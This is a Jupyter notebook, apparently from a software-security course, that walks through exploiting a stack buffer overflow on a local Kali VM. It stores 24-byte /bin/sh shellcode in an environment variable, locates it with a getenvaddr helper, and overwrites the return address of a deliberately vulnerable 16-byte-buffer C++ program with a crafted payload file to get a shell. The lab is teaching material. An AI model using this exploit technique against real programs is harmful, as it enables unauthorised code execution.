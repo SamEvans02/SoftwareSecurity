{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Stack Overflow - Exploiting with Env Variable\n",
    "\n",
    "- often times buffer that has overflow vulnerability is not large enough to fit even the smallest shellcode\n",
    "- in sitation like this, one can stash the shellcode as an environment variable and overwrite the caller's return address with the address of the shellcode stored in environment variable\n",
    "- environment variables are loaded into the memory everytime a program is loaded into memory bydefault\n",
    "- one can also execute program without loading the environment variable, however\n",
    "- **env -i ./program** command, e.g., ignores environment variable when running a program\n",
    "- let's look at how we can programmatically find the address of environment variables using C++\n",
    "- C stanard library's **getenv()** accepts the name of an environment variable as its only argument and returns that variable's memory address\n",
    "- **getenvaddr.cpp** demo provides fairly accurate location by accounting for the length of the target program's name that's also loaded on stack"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cp ./demos/getenvaddr.cpp ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "#include <stdlib.h>\r\n",
      "#include <string.h>\r\n",
      "\r\n",
      "int main(int argc, char *argv[]) {\r\n",
      "\tchar *ptr;\r\n",
      "\r\n",
      "\tif(argc < 3) {\r\n",
      "\t\tprintf(\"Usage: %s <env variable name> <target program name>\\n\", argv[0]);\r\n",
      "\t}\r\n",
      "\telse {\r\n",
      "\t\tptr = getenv(argv[1]); /* get env var location */\r\n",
      "\t\tint diff = (strlen(argv[0]) - strlen(argv[2]))*2;\r\n",
      "\t\tptr += diff; /* adjust for program name */\r\n",
      "\t\tprintf(\"%s will be at %p with reference to %s\\n\", argv[1], ptr, argv[2]);\r\n",
      "\t}\r\n",
      "\treturn 0;\r\n",
      "}\r\n"
     ]
    }
   ],
   "source": [
    "! cat getenvaddr.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "! echo kali | sudo -S ./compile.sh getenvaddr.cpp getenvaddr.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Usage: ./getenvaddr.exe <env variable name> <target program name>\r\n"
     ]
    }
   ],
   "source": [
    "! ./getenvaddr.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "PATH will be at 0xffffdd0f with reference to ./getenvaddr.exe\r\n"
     ]
    }
   ],
   "source": [
    "! ./getenvaddr.exe PATH ./getenvaddr.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Note\n",
    "- the `./getenvaddr.exe` program provides different address when the above command is directly executed from the terminal compared to running it from the Jupyter notebook\n",
    "- the address retrieved from the terminal is the one we need as we'll be exploiting the program directly from terminal and not from the Jupyter notebook!\n",
    "- the following snippet shows the PATH address when executed from the terminal\n",
    "\n",
    "```bash\n",
    "(base) kali@kali:~/projects/EthicalHacking-Notebooks$ ./getenvaddr.exe PATH ./getenvaddr.exe\n",
    "PATH will be at 0xffffdcfc with reference to ./getenvaddr.exe\n",
    "```\n",
    "\n",
    "### Export shellcode\n",
    "- let's copy `shellcode.bin` from the demos folder and export it as an environment variable\n",
    "\n",
    "```bash\n",
    "(base) kali@kali:~/projects/EthicalHacking-Notebooks$ cp ./demos/shellcode.bin .\n",
    "(base) kali@kali:~/projects/EthicalHacking-Notebooks$ wc -c shellcode.bin \n",
    "24 shellcode.bin\n",
    "(base) kali@kali:~/projects/EthicalHacking-Notebooks$ export SHELLCODE=$(cat shellcode.bin)\n",
    "(base) kali@kali:~/projects/EthicalHacking-Notebooks$ echo $SHELLCODE \n",
    "1�Ph//shh/bin��1ɉ�j\n",
    "                   X̀\n",
    "```\n",
    "\n",
    "### Expoit stack_overflow_env.cpp\n",
    "- let's copy and compile the file and exploit it using the shellcode stashed in environment variable\n",
    "- the program has buffer size of 16 bytes which is not big enough to hold our 24 bytes shellcode"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "cp: missing destination file operand after './demos/stack_overflow_env.cpp'\r\n",
      "Try 'cp --help' for more information.\r\n"
     ]
    }
   ],
   "source": [
    "! cp ./demos/stack_overflow_env.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <cstring>\r\n",
      "#include <iostream>\r\n",
      "\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "char * mgets(char *dst) {\r\n",
      "    char *ptr = dst;\r\n",
      "    int ch; \r\n",
      "\t/* skip leading white spaces */ \r\n",
      "    while ((ch = getchar()) && (ch == ' ' or ch == '\\t')) \r\n",
      "        ; \r\n",
      "\r\n",
      "    if ((ch == '\\n') or (ch == EOF)) { \r\n",
      "        *ptr = '\\0';\r\n",
      "        return dst; \r\n",
      "    } \r\n",
      "    else\r\n",
      "        *ptr = ch;\r\n",
      "\r\n",
      "    /* now read the rest until \\n or EOF */ \r\n",
      "    while (ch = getchar()) {\r\n",
      "        if (ch == '\\n' or ch == EOF) break;\r\n",
      "        *(++ptr) = ch; \r\n",
      "    }\r\n",
      "    *(++ptr) = 0;\r\n",
      "    return dst;\r\n",
      "}\r\n",
      "\r\n",
      "void bad() {\r\n",
      "    char buffer[16];\r\n",
      "    cout << \"Enter text: \";\r\n",
      "    mgets(buffer);\r\n",
      "    cout << \"text = \" << buffer << endl;\r\n",
      "}\r\n",
      "\r\n",
      "int main(int argc, char *argv[]) {\r\n",
      "    //char *ptr;\r\n",
      "    //ptr = getenv(\"SHELLCODE\");\r\n",
      "    //printf(\"SHELLCODE is at %p\\n\", ptr);\r\n",
      "    bad();\r\n",
      "    cout << \"Good bye!\\n\";\r\n",
      "    return 0;\r\n",
      "}\r\n",
      "\t\r\n"
     ]
    }
   ],
   "source": [
    "! cat stack_overflow_env.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "! echo kali | sudo -S ./compile.sh stack_overflow_env.cpp stack_overflow_env.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Enter text: text = AAAAAAAAAA\r\n",
      "Good bye!\r\n"
     ]
    }
   ],
   "source": [
    "! python -c 'print(\"A\"*10)' | ./stack_overflow_env.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- first, find the address of SHELLCODE environment variable with respect to stack_overflow_env.exe\n",
    "- repeat the address of SHELLCODE enough to overwrite the caller's return address in `bad()`\n",
    "- VOILA!\n",
    "\n",
    "```bash\n",
    "(base) kali@kali:~/projects/EthicalHacking-Notebooks$ ./getenvaddr.exe SHELLCODE ./stack_overflow_env.exe\n",
    "SHELLCODE will be at 0xffffc5b4 with reference to ./stack_overflow_env.exe\n",
    "```\n",
    "- since the program recieves the data from standard input, we'll create a payload file with the repeated SHELLCODE address (little endian)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [],
   "source": [
    "! python -c 'import sys; sys.stdout.buffer.write(b\"\\xb4\\xc5\\xff\\xff\"*20)' > payload_env.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "80 payload_env.txt\r\n"
     ]
    }
   ],
   "source": [
    "! wc -c payload_env.txt"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- now that the payload_env.txt is created we'll pipe it to the program as stdio\n",
    "\n",
    "```bash\n",
    "(base) kali@kali:~/projects/EthicalHacking-Notebooks$ cat payload_env.txt - | ./stack_overflow_env.exe \n",
    "[enter]\n",
    "Enter text: text = ��������������������������������������������������������������������������������\n",
    "[enter]\n",
    "whoami\n",
    "kali\n",
    "\n",
    "```\n",
    "- the shellcode doesn't provide the prompt and you may have to hit enter on a blank line"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
